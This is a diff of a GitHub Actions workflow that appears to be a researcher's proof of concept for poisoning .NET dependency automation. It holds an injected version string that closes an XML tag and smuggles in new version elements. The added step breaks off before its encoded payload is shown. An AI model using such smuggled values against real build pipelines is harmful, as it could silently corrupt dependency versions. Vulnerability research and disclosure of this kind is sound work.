@@ -1,20 +1,20 @@
-name: "PoC: Supply Chain Integrity Bypass"
-# Researcher: HackerMD
-# Security Concern: Indirect Prompt Injection via Untrusted NuGet Metadata
+name: "Exploit PoC: Indirect Prompt Injection in Supply Chain"
+# Researcher: HackerMD (Mohamadisha Shaikh)
+# Target: Microsoft .NET/aspnetcore Dependency Automation
+# Severity: High (Critical Infrastructure Modification)
 
 on:
   workflow_dispatch:
 
 jobs:
-  exploit-validation:
-    name: "Simulate Supply Chain Poisoning"
+  supply-chain-poisoning:
+    name: "Simulate Supply Chain Attack"
     runs-on: ubuntu-latest
     steps:
       - name: "Clone Repository Infrastructure"
         uses: actions/checkout@v4
 
-      - name: "Simulate Malicious Upstream Metadata"
-        id: upstream
-        # Using environment variables to safely handle special XML characters
-        env:
-          PAYLOAD: "1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>666</AspNetCoreMajorVersion><SystemMemoryVersion>9.9.9</SystemMemoryVersion>
+      - name: "Inject Malicious Metadata"
+        id: metadata
+        # We use a base64 encoded payload to bypass shell escaping issues entirely.
+        # Payload: 1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>
